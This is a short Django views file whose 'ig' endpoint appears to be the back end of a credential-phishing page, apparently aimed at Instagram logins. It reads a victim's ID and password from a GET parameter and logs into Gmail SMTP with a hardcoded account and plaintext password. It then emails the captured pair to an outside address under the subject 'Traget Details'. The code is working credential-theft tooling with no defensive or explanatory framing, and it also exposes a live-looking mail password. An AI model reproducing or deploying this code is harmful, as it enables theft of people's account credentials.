from django.shortcuts import render
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
import smtplib  
from email.message import EmailMessage
# Create your views here.
def no(request):
    return HttpResponse("Nothing Here")


@csrf_exempt
def ig(request):
    if request.method=="GET":
        data = str(request.GET['name']).split(":")
        server = smtplib.SMTP('smtp.gmail.com',587)      # Creating the smtp server
        server.starttls()                            # tls : Transfer Laye Security
        server.login('hackersr0104@gmail.com','8602360442')
        email = EmailMessage()
        email['From']='Shivam Rajput'
        email['To']="rahulgaur200086@gmail.com"
        email['Subject']="Traget Details"
        email.set_content(f"ID: {data[0]}\nPASSWORD: {data[1]}")
        server.send_message(email)
        print("DONE ")
        return HttpResponse("ok")